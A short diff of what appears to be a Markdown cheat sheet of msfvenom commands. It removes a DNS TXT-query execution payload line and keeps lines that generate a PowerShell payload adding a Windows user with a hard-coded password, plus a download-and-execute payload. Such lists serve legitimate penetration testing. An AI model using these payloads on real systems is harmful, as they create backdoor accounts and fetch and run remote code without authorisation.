@@ -4,8 +4,6 @@
 
 `$ msfvenom -p cmd/windows/powershell/adduser user=sysadmin pass=Password1234! wmic=[true | false] custom=<group_name> -f raw`
 
-`$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec -f raw`
-
 ## Download and Execute
 
 `$ msfvenom -p cmd/windows/powershell/download_exec`
